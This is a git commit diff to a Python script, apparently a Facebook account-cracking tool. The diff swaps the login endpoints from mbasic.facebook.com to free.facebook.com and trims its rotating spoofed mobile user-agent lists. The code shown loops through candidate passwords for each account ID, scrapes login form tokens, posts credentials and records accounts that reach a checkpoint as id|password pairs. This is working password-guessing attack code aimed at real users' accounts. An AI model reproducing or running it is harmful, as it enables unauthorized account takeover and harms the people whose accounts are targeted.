bcc68b39834f8e8204f20255f82cc6ce99da1319
shinzy12 <91730481+shinzy12@users.noreply.github.com>
2022-05-16 01:24:51 +0700

    Update Zy.py

--- Zy.py
+++ Zy.py
@@ -24,9 +24,9 @@ from rich import print as cetak
 from rich.markdown import Markdown as mark
 from rich.columns import Columns as col
 try:ugen = open('user.txt','r').read().splitlines()
-except:ugen = ['Mozilla/5.0 (Linux; U; Android 4.2.2; en-US; A65A Build/A65A) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.6.0.586 U3/0.8.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 2.3.5; in-id; EVERCOSS A5A Build/MocorDroid2.3.5) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; Android 4.2.2; ALCATEL ONETOUCH P310A Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Safari/537.36','Mozilla/5.0 (Linux; Android 4.4.2; MITO T80 Build/KOT49H) AppleWebKit/537.36 (KHTML like Gecko) Chrome/40.0.2214.89 Safari/537.36 OPR/27.0.1698.89115','Mozilla/5.0 (Linux; U; Android 4.1.2; en-us; ALCATEL ONE TOUCH 5020N Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.1 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 4.1.1; en-US; ALCATEL ONE TOUCH 5020E Build/JRO03C) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.7.0.636 U3/0.8.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; EVERCOSS A7F Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; Android 7.0; M50 STAR Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/63.0.3239.111 Mobile Safari/537.36']
+except:ugen = ['Mozilla/5.0 (Linux; U; Android 4.2.2; en-US; A65A Build/A65A) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.6.0.586 U3/0.8.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 2.3.5; in-id; EVERCOSS A5A Build/MocorDroid2.3.5) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; Android 4.2.2; ALCATEL ONETOUCH P310A Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Safari/537.36','Mozilla/5.0 (Linux; Android 4.4.2; MITO T80 Build/KOT49H) AppleWebKit/537.36 (KHTML like Gecko) Chrome/40.0.2214.89 Safari/537.36 OPR/27.0.1698.89115','Mozilla/5.0 (Linux; U; Android 4.1.1; en-US; ALCATEL ONE TOUCH 5020E Build/JRO03C) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.7.0.636 U3/0.8.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; EVERCOSS A7F Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30']
 try:ugen2 = open('user.txt','r').read().splitlines()
-except:ugen2 = ['Mozilla/5.0 (Linux; U; Android 4.2.2; en-US; A65A Build/A65A) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.6.0.586 U3/0.8.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 2.3.5; in-id; EVERCOSS A5A Build/MocorDroid2.3.5) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; Android 4.2.2; ALCATEL ONETOUCH P310A Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Safari/537.36','Mozilla/5.0 (Linux; Android 4.4.2; MITO T80 Build/KOT49H) AppleWebKit/537.36 (KHTML like Gecko) Chrome/40.0.2214.89 Safari/537.36 OPR/27.0.1698.89115','Mozilla/5.0 (Linux; U; Android 4.1.2; en-us; ALCATEL ONE TOUCH 5020N Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.1 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 4.1.1; en-US; ALCATEL ONE TOUCH 5020E Build/JRO03C) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.7.0.636 U3/0.8.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; EVERCOSS A7F Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; Android 7.0; M50 STAR Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/63.0.3239.111 Mobile Safari/537.36']
+except:ugen2 = ['Mozilla/5.0 (Linux; U; Android 4.2.2; en-US; A65A Build/A65A) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.6.0.586 U3/0.8.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 2.3.5; in-id; EVERCOSS A5A Build/MocorDroid2.3.5) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; Android 4.2.2; ALCATEL ONETOUCH P310A Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Safari/537.36','Mozilla/5.0 (Linux; Android 4.4.2; MITO T80 Build/KOT49H) AppleWebKit/537.36 (KHTML like Gecko) Chrome/40.0.2214.89 Safari/537.36 OPR/27.0.1698.89115','Mozilla/5.0 (Linux; U; Android 4.1.1; en-US; ALCATEL ONE TOUCH 5020E Build/JRO03C) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.7.0.636 U3/0.8.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; EVERCOSS A7F Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30']
 id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
 
 x = '\33[m' # DEFAULT
@@ -699,8 +699,8 @@ def crack3(idf,pwv):
 	for pw in pwv:
 		try:
 			tix = time.time()
-			ses.headers.update({"Host":'mbasic.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
-			p = ses.get('https://mbasic.facebook.com/login/?email='+idf).text
+			ses.headers.update({"Host":'free.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://free.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
+			p = ses.get('https://free.facebook.com/login/?email='+idf).text
 			dataa ={
 'lsd':re.search('name="lsd" value="(.*?)"', str(p)).group(1),
 'jazoest':re.search('name="jazoest" value="(.*?)"', str(p)).group(1),
@@ -712,7 +712,7 @@ def crack3(idf,pwv):
 			ses.headers.update({'Host': 'mbasic.facebook.com',
 'cache-control': 'max-age=0',
 'upgrade-insecure-requests': '1',
-'origin': 'https://mbasic.facebook.com',
+'origin': 'https://free.facebook.com',
 'content-type': 'application/x-www-form-urlencoded',
 'user-agent': ua,
 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
@@ -720,11 +720,11 @@ def crack3(idf,pwv):
 'sec-fetch-mode': 'cors',
 'sec-fetch-user': 'empty',
 'sec-fetch-dest': 'document',
-'referer': 'https://mbasic.facebook.com/login/?email='+idf,
+'referer': 'https://free.facebook.com/login/?email='+idf,
 'accept-encoding':'gzip, deflate br',
 'accept-language':'en-GB,en-US;q=0.9,en;q=0.8'})
 
-			po = ses.post('https://mbasic.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=dataa,allow_redirects=False)
+			po = ses.post('https://free.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=dataa,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				if 'ya' in oprek:
 					akun.append(idf+'|'+pw)
